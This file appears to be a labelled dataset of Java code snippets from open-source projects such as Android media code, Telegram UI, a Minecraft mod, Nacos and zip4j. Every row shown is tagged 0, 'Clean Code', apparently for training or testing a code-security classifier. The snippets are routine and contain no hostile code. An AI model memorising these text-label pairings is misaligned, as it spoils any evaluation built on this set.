text,label,text_label
"/** 
 * Constructs new audio capabilities based on a set of supported encodings and a maximum channel count. <p>Applications should generally call  {@link #getCapabilities(Context)} to obtain an instancebased on the capabilities advertised by the platform, rather than calling this constructor.
 * @param supportedEncodings Supported audio encodings from {@link android.media.AudioFormat}'s {@code ENCODING_*} constants. Passing {@code null} indicates that no encodings aresupported.
 * @param maxChannelCount The maximum number of audio channels that can be played simultaneously.
 */
public AudioCapabilities(@Nullable int[] supportedEncodings,int maxChannelCount){
  if (supportedEncodings != null) {
    this.supportedEncodings=Arrays.copyOf(supportedEncodings,supportedEncodings.length);
    Arrays.sort(this.supportedEncodings);
  }
 else {
    this.supportedEncodings=new int[0];
  }
  this.maxChannelCount=maxChannelCount;
}",0,Clean Code
"@SubscribeEvent public void onRenderTick(TickEvent.RenderTickEvent ev){
  purgeExpiredFragments(null);
  if (Minecraft.getMinecraft().currentScreen != null && !(Minecraft.getMinecraft().currentScreen instanceof GuiMainMenu))   return;
  if (Minecraft.getMinecraft().gameSettings.showDebugInfo)   return;
  ScaledResolution res=new ScaledResolution(Minecraft.getMinecraft());
  int width=res.getScaledWidth();
  int height=res.getScaledHeight();
  float rx=(float)width / 1000f;
  float ry=(float)height / 1000f;
synchronized (this.fragments) {
    for (    TextCategory cat : TextCategory.values()) {
      TextCategoryAttributes atts=this.attributes.get(cat);
      if (atts != null && (!atts.flashing || ((System.currentTimeMillis() / 500) % 3 != 0)) && shouldDisplay(atts.displayLevel)) {
        int x=Math.round(rx * (float)atts.xOrg);
        int y=Math.round(ry * (float)atts.yOrg);
        ArrayList<TextFragment> frags=this.fragments.get(cat);
        if (frags != null && !frags.isEmpty()) {
          for (          TextFragment frag : frags) {
            drawText(frag.text,x,y,atts.colour);
            y+=10;
          }
        }
      }
    }
  }
}",0,Clean Code
"/** 
 * Get attributes from decoder
 * @param decoder the decode object
 * @param reqAttrs the attributes
 */
private void getAttrsFromDecoder(QueryStringDecoder decoder,Map<String,String> reqAttrs){
  for (  Map.Entry<String,List<String>> attr : decoder.parameters().entrySet()) {
    if (attr == null || attr.getKey() == null || attr.getValue() == null || attr.getValue().isEmpty()) {
      continue;
    }
    reqAttrs.put(attr.getKey(),attr.getValue().get(0));
  }
}",0,Clean Code
"/** 
 * Binds the actions in a media item row object to their views. This consists of creating (or reusing the existing) action view holders, and populating them with the actions' icons.
 */
public void onBindRowActions(){
  for (int i=getMediaItemActionsContainer().getChildCount() - 1; i >= mActionViewHolders.size(); i--) {
    getMediaItemActionsContainer().removeViewAt(i);
    mActionViewHolders.remove(i);
  }
  mMediaItemRowActions=null;
  Object rowObject=getRowObject();
  final MultiActionsProvider.MultiAction[] actionList;
  if (rowObject instanceof MultiActionsProvider) {
    actionList=((MultiActionsProvider)rowObject).getActions();
  }
 else {
    return;
  }
  Presenter actionPresenter=mRowPresenter.getActionPresenter();
  if (actionPresenter == null) {
    return;
  }
  mMediaItemRowActions=actionList;
  for (int i=mActionViewHolders.size(); i < actionList.length; i++) {
    final int actionIndex=i;
    final Presenter.ViewHolder actionViewHolder=actionPresenter.onCreateViewHolder(getMediaItemActionsContainer());
    getMediaItemActionsContainer().addView(actionViewHolder.view);
    mActionViewHolders.add(actionViewHolder);
    actionViewHolder.view.setOnFocusChangeListener(new View.OnFocusChangeListener(){
      @Override public void onFocusChange(      View view,      boolean hasFocus){
        mFocusViewAnimator=updateSelector(mSelectorView,view,mFocusViewAnimator,false);
      }
    }
);
    actionViewHolder.view.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        if (getOnItemViewClickedListener() != null) {
          getOnItemViewClickedListener().onItemClicked(actionViewHolder,mMediaItemRowActions[actionIndex],ViewHolder.this,getRowObject());
        }
      }
    }
);
  }
  if (mMediaItemActionsContainer != null) {
    for (int i=0; i < actionList.length; i++) {
      Presenter.ViewHolder avh=mActionViewHolders.get(i);
      actionPresenter.onUnbindViewHolder(avh);
      actionPresenter.onBindViewHolder(avh,mMediaItemRowActions[i]);
    }
  }
}
/** 
 * Binds the given media item object action to the given ViewHolder's action views.
 * @param vh ViewHolder for the media item.
 */
protected void onBindRowActions(ViewHolder vh){
  vh.onBindRowActions();
}",0,Clean Code
"private void appendContextMenuItemsCategory(AppDialogPresenter settingsPresenter){
  List<OptionItem> options=new ArrayList<>();
  Map<Long,Integer> menuNames=getMenuNames();
  for (  Long menuItem : mMainUIData.getMenuItemsOrdered()) {
    Integer nameResId=menuNames.get(menuItem);
    if (nameResId == null) {
      continue;
    }
    options.add(UiOptionItem.from(getContext().getString(nameResId),optionItem -> {
      if (optionItem.isSelected()) {
        mMainUIData.enableMenuItem(menuItem);
        showMenuItemOrderDialog(menuItem);
      }
 else {
        mMainUIData.disableMenuItem(menuItem);
      }
    }
,mMainUIData.isMenuItemEnabled(menuItem)));
  }
  settingsPresenter.appendCheckedCategory(getContext().getString(R.string.context_menu),options);
}
",0,Clean Code
"private Drawable getEmojiStatusDrawable(TLRPC.EmojiStatus emojiStatus,boolean switchable,boolean animated,int a){
  if (emojiStatusDrawable[a] == null) {
    emojiStatusDrawable[a]=new AnimatedEmojiDrawable.SwapAnimatedEmojiDrawable(nameTextView[a],AndroidUtilities.dp(24),a == 0 ? AnimatedEmojiDrawable.CACHE_TYPE_EMOJI_STATUS : AnimatedEmojiDrawable.CACHE_TYPE_KEYBOARD);
    if (fragmentViewAttached) {
      emojiStatusDrawable[a].attach();
    }
  }
  if (emojiStatus instanceof TLRPC.TL_emojiStatus) {
    emojiStatusDrawable[a].set(((TLRPC.TL_emojiStatus)emojiStatus).document_id,animated);
  }
 else   if (emojiStatus instanceof TLRPC.TL_emojiStatusUntil && ((TLRPC.TL_emojiStatusUntil)emojiStatus).until > (int)(System.currentTimeMillis() / 1000) && !reportSpam) {
    emojiStatusDrawable[a].set(((TLRPC.TL_emojiStatusUntil)emojiStatus).document_id,animated);
  }
 else {
    emojiStatusDrawable[a].set(getPremiumCrossfadeDrawable(),animated);
  }
  updateEmojiStatusDrawableColor();
  return emojiStatusDrawable[a];
}",0,Clean Code
"/** 
 * Returns the AC-3 format given  {@code data} containing the AC3SpecificBox according to ETSI TS102 366 Annex F. The reading position of  {@code data} will be modified.
 * @param data The AC3SpecificBox to parse.
 * @param trackId The track identifier to set on the format.
 * @param language The language to set on the format.
 * @param drmInitData {@link DrmInitData} to be included in the format.
 * @return The AC-3 format parsed from data in the header.
 */
public static Format parseAc3AnnexFFormat(ParsableByteArray data,String trackId,String language,DrmInitData drmInitData){
  int fscod=(data.readUnsignedByte() & 0xC0) >> 6;
  int sampleRate=SAMPLE_RATE_BY_FSCOD[fscod];
  int nextByte=data.readUnsignedByte();
  int channelCount=CHANNEL_COUNT_BY_ACMOD[(nextByte & 0x38) >> 3];
  if ((nextByte & 0x04) != 0) {
    channelCount++;
  }
  return Format.createAudioSampleFormat(trackId,MimeTypes.AUDIO_AC3,null,Format.NO_VALUE,Format.NO_VALUE,channelCount,sampleRate,null,drmInitData,0,language);
}",0,Clean Code
"@Override public boolean isValid(@Nullable Constant value,@NonNull AnnotationValue<ConstantRetryValidation> annotationMetadata,@NonNull ConstraintValidatorContext context){
  if (value == null) {
    return true;
  }
  if (value.getMaxDuration() != null && value.getInterval() != null && value.getMaxDuration().compareTo(value.getInterval()) <= 0) {
    context.disableDefaultConstraintViolation();
    context.buildConstraintViolationWithTemplate(""'interval' must be less than 'maxDuration' but is "" + value.getInterval()).addConstraintViolation();
    return false;
  }
  return true;
}",0,Clean Code
"public static LimitReachedBottomSheet openBoostsForRemoveRestrictions(BaseFragment baseFragment,TL_stories.TL_premium_boostsStatus boostsStatus,ChannelBoostsController.CanApplyBoost canApplyBoos,long dialogId,boolean inFragment){
  if (baseFragment == null || boostsStatus == null || canApplyBoos == null || baseFragment.getContext() == null) {
    return null;
  }
  LimitReachedBottomSheet limitReachedBottomSheet=new LimitReachedBottomSheet(baseFragment,baseFragment.getContext(),TYPE_BOOSTS_FOR_REMOVE_RESTRICTIONS,baseFragment.getCurrentAccount(),baseFragment.getResourceProvider());
  limitReachedBottomSheet.setCanApplyBoost(canApplyBoos);
  limitReachedBottomSheet.setBoostsStats(boostsStatus,true);
  limitReachedBottomSheet.setDialogId(dialogId);
  if (inFragment) {
    baseFragment.showDialog(limitReachedBottomSheet);
  }
 else {
    limitReachedBottomSheet.show();
  }
  return limitReachedBottomSheet;
}
",0,Clean Code
"/** 
 * Attempt to find a smelting recipe that results in the requested output.
 * @param output The output of the furnace burn
 * @return an ItemStack representing the required input.
 */
public static ItemStack getSmeltingRecipeForRequestedOutput(String output,EntityPlayerMP player){
  ItemStack target=MinecraftTypeHelper.getItemStackFromParameterString(output);
  if (target == null)   return null;
  for (  Map.Entry<ItemStack,ItemStack> e : FurnaceRecipes.instance().getSmeltingList().entrySet()) {
    if (itemStackIngredientsMatch(target,e.getValue()) && playerHasIngredients(player,Collections.singletonList(e.getKey())) && totalBurnTimeInInventory(player) >= smeltingCookingTime) {
      return e.getKey();
    }
  }
  return null;
}
",0,Clean Code
"private boolean reevaluateIfSoundIsOn(){
  if (mSettingsValues == null || !mSettingsValues.mSoundOn || mAudioManager == null) {
    return false;
  }
  return mAudioManager.getRingerMode() == AudioManager.RINGER_MODE_NORMAL;
}
",0,Clean Code
"@Override public Object invoke(Object self,Method originalMethod,Method proxyMethod,Object[] args) throws Throwable {
  String methodName=originalMethod.getName();
  if (methodName.startsWith(""set"") && methodName.length() > 3 && Character.isUpperCase(methodName.charAt(3)) && originalMethod.getParameterCount() == 1) {
    String property=StringUtil.firstCharToLowerCase(originalMethod.getName().substring(3));
    FieldWrapper fw=FieldWrapper.of(originalMethod.getDeclaringClass(),property);
    if (fw != null && fw.isIgnore()) {
      return proxyMethod.invoke(self,args);
    }
    updates.put(fw == null ? property : fw.getField().getName(),args[0]);
  }
  return proxyMethod.invoke(self,args);
}",0,Clean Code
"public static boolean subnetContains(InetAddress subnet,int prefix,InetAddress address){
  int addrlen=subnet.getAddress().length;
  ByteBuffer maskBuf=ByteBuffer.allocate(addrlen);
  for (int i=0; i < addrlen / 4; i++)   maskBuf.putInt(-1);
  BigInteger mask=((new BigInteger(1,maskBuf.array())).shiftRight(prefix)).not();
  BigInteger start=new BigInteger(1,subnet.getAddress()).and(mask);
  BigInteger end=start.add(mask.not());
  BigInteger toCheck=new BigInteger(1,address.getAddress());
  return ((toCheck.compareTo(start) >= 0) && (toCheck.compareTo(end) <= 0));
}
public static boolean subnetContains(String subnet,int prefix,String address){
  try {
    return subnetContains(InetAddress.getByName(subnet),prefix,InetAddress.getByName(address));
  }
 catch (  UnknownHostException ignored) {
    return false;
  }
}",0,Clean Code
"public void update(Service vDom){
  if (!StringUtils.equals(token,vDom.getToken())) {
    Loggers.SRV_LOG.info(""[SERVICE-UPDATE] service: {}, token: {} -> {}"",getName(),token,vDom.getToken());
    token=vDom.getToken();
  }
  if (!ListUtils.isEqualList(owners,vDom.getOwners())) {
    Loggers.SRV_LOG.info(""[SERVICE-UPDATE] service: {}, owners: {} -> {}"",getName(),owners,vDom.getOwners());
    owners=vDom.getOwners();
  }
  if (getProtectThreshold() != vDom.getProtectThreshold()) {
    Loggers.SRV_LOG.info(""[SERVICE-UPDATE] service: {}, protectThreshold: {} -> {}"",getName(),getProtectThreshold(),vDom.getProtectThreshold());
    setProtectThreshold(vDom.getProtectThreshold());
  }
  if (resetWeight != vDom.getResetWeight().booleanValue()) {
    Loggers.SRV_LOG.info(""[SERVICE-UPDATE] service: {}, resetWeight: {} -> {}"",getName(),resetWeight,vDom.getResetWeight());
    resetWeight=vDom.getResetWeight();
  }
  if (enabled != vDom.getEnabled().booleanValue()) {
    Loggers.SRV_LOG.info(""[SERVICE-UPDATE] service: {}, enabled: {} -> {}"",getName(),enabled,vDom.getEnabled());
    enabled=vDom.getEnabled();
  }
  selector=vDom.getSelector();
  setMetadata(vDom.getMetadata());
  updateOrAddCluster(vDom.getClusterMap().values());
  remvDeadClusters(this,vDom);
  recalculateChecksum();
}
",0,Clean Code
"@Override public FileVisitResult visitFile(Path file,BasicFileAttributes attrs) throws IOException {
  if (file.getNameCount() > 2) {
    return super.visitFile(file,attrs);
  }
  addLocaleIfPresent(file,langs,locales);
  return super.visitFile(file,attrs);
}
@Override public FileVisitResult visitFile(Path file,BasicFileAttributes attrs) throws IOException {
  final String filename=file.getFileName().toString().toLowerCase(Locale.ROOT);
  if (addLocaleIfPresent(file,langs,locales)) {
  }
 else   if (filename.endsWith("".jar"") && fileMasks.stream().anyMatch(filename::contains) && Files.isRegularFile(file)&& Files.isReadable(file)) {
    try (FileSystem jarfs=FileSystems.newFileSystem(file,(ClassLoader)null)){
      for (      Path rootPath : jarfs.getRootDirectories()) {
        Files.walkFileTree(rootPath,simpleFileVisitor);
      }
    }
   }
  return super.visitFile(file,attrs);
}",0,Clean Code
"@Test(timeout=3 * TIME_OUT) public void testExportByGroup(){
  String getDataUrl=""?search=accurate&dataId=&group=DEFAULT_GROUP&appName=&config_tags=&pageNo=1&pageSize=10&tenant=&namespaceId="";
  String queryResult=httpClient.get(SERVER_ADDR + CONFIG_CONTROLLER_PATH + getDataUrl,null);
  JSONObject resultObj=JSON.parseObject(queryResult);
  JSONArray resultConfigs=resultObj.getJSONArray(""pageItems"");
  Assert.assertEquals(2,resultConfigs.size());
  JSONObject config1=resultConfigs.getJSONObject(0);
  JSONObject config2=resultConfigs.getJSONObject(1);
  String exportByIdsUrl=""?export=true&tenant=&group=DEFAULT_GROUP&appName=&ids="";
  byte[] zipData=httpClient.download(SERVER_ADDR + CONFIG_CONTROLLER_PATH + exportByIdsUrl,null);
  ZipUtils.UnZipResult unZiped=ZipUtils.unzip(zipData);
  List<ZipUtils.ZipItem> zipItemList=unZiped.getZipItemList();
  Assert.assertEquals(2,zipItemList.size());
  String config1Name=config1.getString(""group"") + ""/"" + config1.getString(""dataId"");
  String config2Name=config2.getString(""group"") + ""/"" + config2.getString(""dataId"");
  for (  ZipUtils.ZipItem zipItem : zipItemList) {
    if (!(config1Name.equals(zipItem.getItemName()) || config2Name.equals(zipItem.getItemName()))) {
      Assert.fail();
    }
  }
  Map<String,String> metaData=processMetaData(unZiped.getMetaDataItem());
  String metaDataName=packageMetaName(""DEFAULT_GROUP"",""testHasAppname1.properties"");
  String appName=metaData.get(metaDataName);
  Assert.assertNotNull(appName);
  Assert.assertEquals(""testApp1"",appName);
}",0,Clean Code
"@NonNull public static RichInputMethodSubtype getNoLanguageSubtype(){
  RichInputMethodSubtype noLanguageSubtype=sNoLanguageSubtype;
  if (noLanguageSubtype == null) {
    final InputMethodSubtype rawNoLanguageSubtype=RichInputMethodManager.getInstance().findSubtypeByLocaleAndKeyboardLayoutSet(LocaleUtils.constructLocale(SubtypeLocaleUtils.NO_LANGUAGE),SubtypeLocaleUtils.QWERTY);
    if (rawNoLanguageSubtype != null) {
      noLanguageSubtype=new RichInputMethodSubtype(rawNoLanguageSubtype);
    }
  }
  if (noLanguageSubtype != null) {
    sNoLanguageSubtype=noLanguageSubtype;
    return noLanguageSubtype;
  }
  Log.w(TAG,""Can't find any language with QWERTY subtype"");
  Log.w(TAG,""No input method subtype found; returning dummy subtype: "" + DUMMY_NO_LANGUAGE_SUBTYPE);
  return DUMMY_NO_LANGUAGE_SUBTYPE;
}
",0,Clean Code
"private void drawBackground(Canvas canvas,RectF rectF,float r,float alpha,View view){
  if (keyboardT > 0 && blurPaint != null && blurBitmapShader != null && blurBitmap != null && !blurBitmap.isRecycled()) {
    blurBitmapMatrix.reset();
    blurBitmapMatrix.postScale((float)rootView.getWidth() / blurBitmap.getWidth(),(float)rootView.getHeight() / blurBitmap.getHeight());
    float x=0, y=0;
    for (int i=0; i < 8 && view != null; ++i) {
      x+=view.getX();
      y+=view.getY();
      ViewParent parent=view.getParent();
      view=parent instanceof View ? (View)parent : null;
    }
    blurBitmapMatrix.postTranslate(-x,-y);
    blurBitmapShader.setLocalMatrix(blurBitmapMatrix);
    blurPaint.setAlpha((int)(0xFF * keyboardT * alpha));
    canvas.drawRoundRect(rectF,r,r,blurPaint);
  }
  backgroundPaint.setAlpha((int)(blurPaint == null ? 0x80 : lerp(0x80,0x99,keyboardT) * alpha));
  canvas.drawRoundRect(rectF,r,r,backgroundPaint);
}",0,Clean Code
"@Override public String getQueryPlan(String selectStr,CockroachDBGlobalState globalState) throws Exception {
  String queryPlan="""";
  String explainQuery=""EXPLAIN (OPT) "" + selectStr;
  if (globalState.getOptions().logEachSelect()) {
    globalState.getLogger().writeCurrent(explainQuery);
    try {
      globalState.getLogger().getCurrentFileWriter().flush();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  SQLQueryAdapter q=new SQLQueryAdapter(explainQuery);
  boolean afterProjection=false;
  try (SQLancerResultSet rs=q.executeAndGet(globalState)){
    if (rs != null) {
      while (rs.next()) {
        String targetQueryPlan=rs.getString(1).replace(""鈹斺攢鈹�"","""").replace(""鈹溾攢鈹�"","""").replace(""鈹�"","""").trim() + "";"";
        if (afterProjection) {
          afterProjection=false;
          continue;
        }
        if (targetQueryPlan.startsWith(""projections"")) {
          afterProjection=true;
        }
        if (targetQueryPlan.contains("">"") || targetQueryPlan.contains(""<"") || targetQueryPlan.contains(""="")|| targetQueryPlan.contains(""*"")|| targetQueryPlan.contains(""+"")|| targetQueryPlan.contains(""'"")) {
          continue;
        }
        queryPlan+=targetQueryPlan;
      }
    }
  }
 catch (  AssertionError e) {
    throw new AssertionError(""Explain failed: "" + explainQuery);
  }
  return queryPlan;
}",0,Clean Code
"/** 
 * Returns the child CellLayout if the point is inside the page coordinates, null otherwise.
 */
private CellLayout verifyInsidePage(int pageNo,float x,float y){
  if (pageNo >= 0 && pageNo < getPageCount()) {
    CellLayout cl=(CellLayout)getChildAt(pageNo);
    if (x >= cl.getLeft() && x <= cl.getRight() && y >= cl.getTop() && y <= cl.getBottom()) {
      return cl;
    }
  }
  return null;
}",0,Clean Code
"@Override protected void onLayout(boolean changed,int left,int top,int right,int bottom){
  if (mUnlockWallpaperFromDefaultPageOnLayout) {
    mWallpaperOffset.setLockToDefaultPage(false);
    mUnlockWallpaperFromDefaultPageOnLayout=false;
  }
  if (mFirstLayout && mCurrentPage >= 0 && mCurrentPage < getChildCount()) {
    mWallpaperOffset.syncWithScroll();
    mWallpaperOffset.jumpToFinal();
  }
  super.onLayout(changed,left,top,right,bottom);
  updatePageAlphaValues();
}",0,Clean Code
"@Override public CharSequence apply(IN input,Schema<IN,?> schema){
  return apply(input,schema,0);
}
@Override public CharSequence apply(IN input,Schema<IN,?> schema,long rowId){
  Field<?,? extends CharSequence>[] fields=(Field<?,? extends CharSequence>[])schema.getFields();
  if (fields.length == 0) {
    return EMPTY_RESULT;
  }
  if (withBatchMode) {
    if (rowId == 0 || batchSize > 0 && rowId % batchSize == 0) {
      return SqlDialect.getFirstRow(dialect,() -> appendTableInfo(fields),() -> addValues(input,fields),keywordCase);
    }
 else {
      return String.join(LINE_SEPARATOR,"","",SqlDialect.getOtherRow(dialect,() -> appendTableInfo(fields),() -> addValues(input,fields),keywordCase));
    }
  }
 else {
    return String.join("" "",INSERT_INTO.getValue(keywordCase),appendTableInfo(fields),VALUES.getValue(keywordCase),addValues(input,fields));
  }
}",0,Clean Code
"/** 
 * Returns the writeReplace method
 */
protected static Method getWriteReplace(Class<?> cl,Class<?> param){
  for (; cl != null; cl=cl.getSuperclass()) {
    for (    Method method : cl.getDeclaredMethods()) {
      if (method.getName().equals(""writeReplace"") && method.getParameterTypes().length == 1 && param.equals(method.getParameterTypes()[0]))       return method;
    }
  }
  return null;
}
/** 
 * Returns the writeReplace method
 */
protected static Method getWriteReplace(Class<?> cl){
  for (; cl != null; cl=cl.getSuperclass()) {
    Method[] methods=cl.getDeclaredMethods();
    for (int i=0; i < methods.length; i++) {
      Method method=methods[i];
      if (method.getName().equals(""writeReplace"") && method.getParameterTypes().length == 0)       return method;
    }
  }
  return null;
}",0,Clean Code
"public static Scan scan(BufferedImage bufferedImage){
  try {
    BufferedImage grayscale=new BufferedImage(bufferedImage.getWidth(),bufferedImage.getHeight(),BufferedImage.TYPE_BYTE_GRAY);
    Graphics2D g2d=(Graphics2D)grayscale.getGraphics();
    g2d.drawImage(bufferedImage,0,0,null);
    g2d.dispose();
    byte[] data=convertToY800(grayscale);
    try (Image image=new Image()){
      image.setSize(grayscale.getWidth(),grayscale.getHeight());
      image.setFormat(""Y800"");
      image.setData(data);
      try (ImageScanner scanner=new ImageScanner()){
        scanner.setConfig(Symbol.NONE,Config.ENABLE,0);
        scanner.setConfig(Symbol.QRCODE,Config.ENABLE,1);
        int result=scanner.scanImage(image);
        if (result != 0) {
          try (SymbolSet results=scanner.getResults()){
            Scan scan=null;
            for (Iterator<Symbol> iter=results.iterator(); iter.hasNext(); ) {
              try (Symbol symbol=iter.next()){
                scan=new Scan(getRawBytes(symbol.getData()),symbol.getData());
              }
             }
            return scan;
          }
         }
      }
     }
   }
 catch (  Exception e) {
    log.debug(""Error scanning with ZBar"",e);
  }
  return null;
}
public record Scan(byte[] rawData,String stringData){
}",0,Clean Code
"public static double dp2(int N,int M,int K){
  if (N < 1 || M < 1 || K < 1) {
    return 0;
  }
  long all=(long)Math.pow(M + 1,K);
  long[][] dp=new long[K + 1][N + 1];
  dp[0][0]=1;
  for (int times=1; times <= K; times++) {
    dp[times][0]=(long)Math.pow(M + 1,times);
    for (int hp=1; hp <= N; hp++) {
      dp[times][hp]=dp[times][hp - 1] + dp[times - 1][hp];
      if (hp - 1 - M >= 0) {
        dp[times][hp]-=dp[times - 1][hp - 1 - M];
      }
 else {
        dp[times][hp]-=Math.pow(M + 1,times - 1);
      }
    }
  }
  long kill=dp[K][N];
  return (double)((double)kill / (double)all);
}",0,Clean Code
"@Override @NonNull public String toString(){
  return toString(0,false);
}
public String toString(final int indentCount,final boolean plumbing){
  final StringBuilder indent=new StringBuilder();
  if (plumbing) {
    indent.append(""H:"");
  }
 else {
    for (int i=0; i < indentCount; ++i) {
      indent.append("" "");
    }
  }
  final StringBuilder s=new StringBuilder();
  for (  final String optionKey : mAttributes.keySet()) {
    s.append(indent);
    s.append(optionKey);
    s.append("" = "");
    if (""date"".equals(optionKey) && !plumbing) {
      s.append(new Date(1000 * Long.parseLong(mAttributes.get(optionKey))));
    }
 else {
      s.append(mAttributes.get(optionKey));
    }
    s.append(""\n"");
  }
  return s.toString();
}",0,Clean Code
"/** 
 * Assert that the given text does not contain the given substring. <pre class=""code"">Assert.doesNotContain(name, ""rod"", ""Name must not contain 'rod'"");</pre>
 * @param textToSearch the text to search
 * @param substring the substring to find within the text
 * @param message the exception message to use if the assertion fails
 */
public static void doesNotContain(String textToSearch,String substring,String message){
  if (StringUtils.hasLength(textToSearch) && StringUtils.hasLength(substring) && textToSearch.indexOf(substring) != -1) {
    throw new IllegalArgumentException(message);
  }
}
/** 
 * Assert that the given text does not contain the given substring. <pre class=""code"">Assert.doesNotContain(name, ""rod"");</pre>
 * @param textToSearch the text to search
 * @param substring the substring to find within the text
 */
public static void doesNotContain(String textToSearch,String substring){
  doesNotContain(textToSearch,substring,""[Assertion failed] - this String argument must not contain the substring ["" + substring + ""]"");
}",0,Clean Code
"/** 
 * Returns the path itself if a directory exists at it and is readable, otherwise returns {@link TermuxPropertyConstants#DEFAULT_IVALUE_DEFAULT_WORKING_DIRECTORY}.
 * @param path The {@link String} path to check.
 * @return Returns the internal value for value.
 */
public static String getDefaultWorkingDirectoryInternalPropertyValueFromValue(String path){
  if (path == null || path.isEmpty())   return TermuxPropertyConstants.DEFAULT_IVALUE_DEFAULT_WORKING_DIRECTORY;
  File workDir=new File(path);
  if (!workDir.exists() || !workDir.isDirectory() || !workDir.canRead()) {
    Logger.logError(LOG_TAG,""The path \"""" + path + ""\"" for the key \""""+ TermuxPropertyConstants.KEY_DEFAULT_WORKING_DIRECTORY+ ""\"" does not exist, is not a directory or is not readable. Using default value \""""+ TermuxPropertyConstants.DEFAULT_IVALUE_DEFAULT_WORKING_DIRECTORY+ ""\"" instead."");
    return TermuxPropertyConstants.DEFAULT_IVALUE_DEFAULT_WORKING_DIRECTORY;
  }
 else {
    return path;
  }
}
",0,Clean Code
"public LocalFileHeader getNextEntry() throws IOException {
  return getNextEntry(null,true);
}
public LocalFileHeader getNextEntry(FileHeader fileHeader,boolean readUntilEndOfCurrentEntryIfOpen) throws IOException {
  if (localFileHeader != null && readUntilEndOfCurrentEntryIfOpen) {
    readUntilEndOfEntry();
  }
  localFileHeader=headerReader.readLocalFileHeader(inputStream,zip4jConfig.getCharset());
  if (localFileHeader == null) {
    return null;
  }
  if (localFileHeader.isEncrypted() && password == null && passwordCallback != null) {
    setPassword(passwordCallback.getPassword());
  }
  verifyLocalFileHeader(localFileHeader);
  crc32.reset();
  if (fileHeader != null) {
    localFileHeader.setCrc(fileHeader.getCrc());
    localFileHeader.setCompressedSize(fileHeader.getCompressedSize());
    localFileHeader.setUncompressedSize(fileHeader.getUncompressedSize());
    localFileHeader.setDirectory(fileHeader.isDirectory());
    canSkipExtendedLocalFileHeader=true;
  }
 else {
    canSkipExtendedLocalFileHeader=false;
  }
  this.decompressedInputStream=initializeEntryInputStream(localFileHeader);
  this.entryEOFReached=false;
  return localFileHeader;
}",0,Clean Code
"private void updateBackgroundImage(){
  if (contentView.getMeasuredWidth() == 0 || contentView.getMeasuredHeight() == 0 || backgroundView == null || backgroundView.imageView == null) {
    return;
  }
  if (whiteBackground) {
    Bitmap bitmap=Bitmap.createBitmap(50,50,Bitmap.Config.ARGB_8888);
    Canvas canvas=new Canvas(bitmap);
    canvas.drawColor(ColorUtils.blendARGB(getThemedColor(Theme.key_premiumGradient2),getThemedColor(Theme.key_dialogBackground),0.5f));
    backgroundView.imageView.setBackgroundBitmap(bitmap);
  }
 else {
    gradientTools.gradientMatrix(0,0,contentView.getMeasuredWidth(),contentView.getMeasuredHeight(),0,0);
    gradientCanvas.save();
    gradientCanvas.scale(100f / contentView.getMeasuredWidth(),100f / contentView.getMeasuredHeight());
    gradientCanvas.drawRect(0,0,contentView.getMeasuredWidth(),contentView.getMeasuredHeight(),gradientTools.paint);
    gradientCanvas.restore();
    backgroundView.imageView.setBackgroundBitmap(gradientTextureBitmap);
  }
}",0,Clean Code
"public static int maxValue(int[] w,int[] v,int bag){
  if (w == null || v == null || w.length != v.length || w.length == 0) {
    return 0;
  }
  return process(w,v,0,bag);
}",0,Clean Code
"private Result<ConnectorMetrics> getConnectorTaskMetricsAvg(VersionItemParam metricParam){
  ConnectorMetricParam param=(ConnectorMetricParam)metricParam;
  Long connectClusterId=param.getConnectClusterId();
  String connectorName=param.getConnectorName();
  String metric=param.getMetricName();
  ConnectorTypeEnum connectorType=param.getConnectorType();
  Result<List<ConnectorTaskMetrics>> ret=this.getConnectorTaskMetricList(connectClusterId,connectorName,metric,connectorType);
  if (ret == null || !ret.hasData() || ret.getData().isEmpty()) {
    return Result.buildFailure(NOT_EXIST);
  }
  Float sum=ret.getData().stream().map(elem -> elem.getMetric(metric)).reduce(Float::sum).get();
  return Result.buildSuc(new ConnectorMetrics(connectClusterId,connectorName,metric,sum / ret.getData().size()));
}
",0,Clean Code
